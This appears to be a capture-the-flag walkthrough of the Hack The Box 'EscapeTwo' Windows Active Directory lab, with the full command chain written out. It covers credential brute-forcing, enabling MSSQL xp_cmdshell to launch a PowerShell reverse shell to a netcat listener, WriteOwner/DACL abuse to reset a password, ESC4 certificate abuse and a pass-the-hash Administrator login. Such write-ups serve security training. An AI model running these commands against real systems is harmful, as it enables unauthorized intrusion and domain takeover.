
---
date: 2025-06-28
categories: [Windows, Easy, AD]
---

![EscapeTwo](https://labs.hackthebox.com/storage/avatars/d5fcf2425893a73cf137284e2de580e1.png)

---

| **Created by** | **Page**     | **Difficulty** | **OS**  |
|-------------|--------------|----------------|---------|
| [ruycr4ft](https://app.hackthebox.com/users/1253217) & [Llo0zy](https://app.hackthebox.com/users/1615089)        | [Hack The Box](https://www.hackthebox.com/)     | Easy           | Windows   |

---








 - I began with a full TCP port scan, followed by a service and version detection scan on the discovered open ports

	```python
	nmap -p- --open --min-rate 5000 -Pn -sS 10.10.11.51 -oG scan
	/opt/extractports scan
	nmap -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,47001,49664,49665,49666,49667,49685,49686,49687,49702,49718,49739,49807 -sCV -Pn 10.10.11.51 -oN ports
	```

	![image](https://github.com/user-attachments/assets/a4401c2d-573a-4406-9cb8-092f567e3286)

- I found the domain `sequel.htb` and `DC01.sequel.htb` and add it to the file in the `hosts` file.

## Initial Access (SMB Enumeration)

- Hack The Box provided initial credentials:
	```python
	Username: rose  
	Password: KxEPkKe6R8su
	```

- Using `netexec`, I enumerated accessible SMB shares:

	```python
	netexec smb 10.10.11.51 -u rose -p KxEPkKe6R8su --shares
	```

- The share named `Accounting Department` was accessible. I mounted it using `smbclient`:

	```python
	smbclient  //10.10.11.51/"Accounting Department" -U "rose"
	```

- Inside the share, I found two `.xlsx` files containing several potential credentials. I brute-forced SMB logins with these using:

	```python
	netexec smb 10.10.11.51 -u users -p pass --continue-on-success
	```

- This revealed that the user `oscar` had valid credentials, although they didn’t provide further access.

## Exploiting MSSQL Service

- Continuing the brute-force process, I discovered that the `sa` account had valid credentials on the MSSQL service. I connected using `impacket-mssqlclient`:
	
	```python
	impacket-mssqlclient sa@10.10.11.51
	```
	

- I try to execute command using “xp_cmdshell” and it is not enabled.

```python
	EXEC xp_cmdshell 'dir C:\'
```

- Initially, `xp_cmdshell` was disabled. I attempted to enable it using the following commands:

	```python
	EXEC sp_configure 'show advanced options', 1;
	RECONFIGURE;
	EXEC sp_configure 'xp_cmdshell', 1;
	RECONFIGURE;
	EXEC xp_cmdshell 'dir C:\';
	```


- Once enabled, I generated a reverse shell payload using [revshells.com](https://www.revshells.com) and executed it through `xp_cmdshell`:

	```python
	EXEC xp_cmdshell 'powershell -e <Base64 encoded payload>';
	```

- On my listener:

	```python
	nc -nlvp 4444
	```

- Having already a shell as the user sa, I search through the files and I find inside the SQL2019 directory a configuration file “sql-Configuration.INI” that contains some credentials.


## Privilege Escalation to ryan (WinRM)

- While exploring the file system with the `sa` shell, I located a file `sql-Configuration.INI` in the `SQL2019` directory, which contained credentials for the `ryan` user.

- I confirmed that `ryan` was a member of the _Remote Management Users_ group, allowing WinRM access:

	```python
	evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3
	```

- After logging in successfully, I retrieved the first flag.

## Enumeration with BloodHound

- To identify privilege escalation paths, I collected data using `bloodhound-python`:

	```python
	bloodhound-python -c all -u ryan -p WqSZAF6CysDQbGb3 -ns 10.10.11.51 -d sequel.htb
	```

- Analysis revealed that the user `ryan` had `WriteOwner` permissions over the `ca_svc` user. This permission allows changing ownership and resetting the password.

![image](https://github.com/user-attachments/assets/3c74da8f-424b-43dd-b8b2-412d32cfadf1)

## Abusing WriteOwner Rights

- Following the methodology described in [HackingArticles](https://www.hackingarticles.in/abusing-ad-dacl-writeowner/), I used Impacket tools to change ownership and grant full control:

	```python
	python3 owneredit.py  -action write -new-owner 'ryan' -target-dn 'CN=Certification Authority,CN=Users,DC=sequel,DC=htb' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51
	```

- Then granted `FullControl`:

	```python
	python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target-dn 'CN=Certification Authority,CN=Users,DC=sequel,DC=htb' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51
	```

- Finally, I changed the password:

	```python
	net rpc password ca_svc  'PepePepe' -U sequel.htb/ryan%'WqSZAF6CysDQbGb3' -S 10.10.11.51
	netexec smb 10.10.11.51 -u ca_svc -p 'PepePepe'
	```

## ADCS Exploitation (ESC4)

- With access to `ca_svc`, I enumerated certificate templates using `certipy-ad`:

	```python
	certipy-ad find -u ca_svc -p 'PepePepe' -dc-ip 10.10.11.51 -stdout -enabled -vulnerable
	```

- One of the templates was vulnerable to [ESC4](https://adminions.ca/books/abusing-active-directory-certificate-services/page/esc4). I used `certipy-ad` to request a certificate with the UPN set to `Administrator`:

	```python
	certipy-ad template -u 'ca_svc@sequel.htb' -p 'PepePepe' -template DunderMifflinAuthentication -save-old -dc-ip 10.10.11.51
	
	certipy-ad req -u 'ca_svc@sequel.htb' -p 'PepePepe' -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn Administrator
	
	certipy-ad auth -pfx administrator.pfx -username Administrator -domain sequel.htb
	```

- With the certificate, I obtained the hash for the `Administrator` account and logged in using Evil-WinRM:

	```python
	evil-winrm -i 10.10.11.51 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
	```

- This granted me full administrative access and allowed retrieval of the final flag.
